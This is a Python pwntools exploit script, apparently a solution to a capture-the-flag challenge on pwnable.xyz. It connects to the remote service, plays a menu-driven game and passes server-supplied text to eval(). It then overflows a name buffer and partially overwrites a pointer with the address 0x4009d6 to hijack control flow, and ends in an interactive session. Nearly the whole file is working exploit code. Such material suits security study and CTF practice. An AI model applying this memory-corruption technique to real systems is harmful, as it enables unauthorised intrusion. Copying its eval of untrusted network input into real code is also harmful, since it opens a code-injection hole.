#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30009)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('0. Exit')
    io.sendline(str(idx))

def play():
    menu(1)
    res = io.recvuntil("=")[2:-1]
    ans = eval(res)
    io.sendline(str(ans & 0xffffffff))

def edit(nm):
    menu(3)
    sleep(1)
    io.send(nm)

def save():
    menu(2)


io.recvuntil("Name: ")
io.send('a' * 0x10)
menu(1)
io.sendline('1')
save()
edit('a' * 0x18 + p64(0x4009d6)[:3])

io.sendline('1')
io.interactive()
